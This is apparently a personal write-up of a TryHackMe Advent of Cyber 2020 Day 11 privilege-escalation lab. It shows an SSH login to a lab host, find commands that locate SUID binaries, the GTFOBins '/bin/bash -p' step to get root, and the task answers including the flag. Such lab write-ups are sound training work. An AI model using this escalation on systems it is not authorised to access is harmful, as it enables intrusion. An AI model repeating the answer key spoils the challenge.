---
title: "TryHackMe Advent of Cyber 2020 Day 11"
date: 2021-12-11
layout: post
platform: "TryHackMe"
writeup_type: "seasonal"
series: "Advent of Cyber 2020"
event_day: "Day 11"
permalink: "/writeups/advent-of-cyber/25days-of-cybersecurity-day-11/"
tags:
  - tryhackme
  - seasonal
  - advent-of-cyber-2020
  - day-11
---

# tbfcpriv2

```text
ssh cmnatic@10.10.32.91
password: [redacted]
```

```text
suid perm for /bin/bash
	-via find / -perm -u=s -type f 2>/dev/null    or   find / -perm /4000 -type f 2>/dev/null

referring GTFOBins
	/bin/bash -p

got root user
''''

# TASK

1. What type of privilege escalation involves using a user account to exectr commands as an administrator?
```
Vertical
```text
2. What is the name of the file that contains a list of users who are a part of sudo group?
```
sudoers
```text
3. No answer needed

4. No answer needed

5. What are the contents of the file located at /root/flag.txt
```
thm{2fb10afe933296592}
```text
===============================================================
```
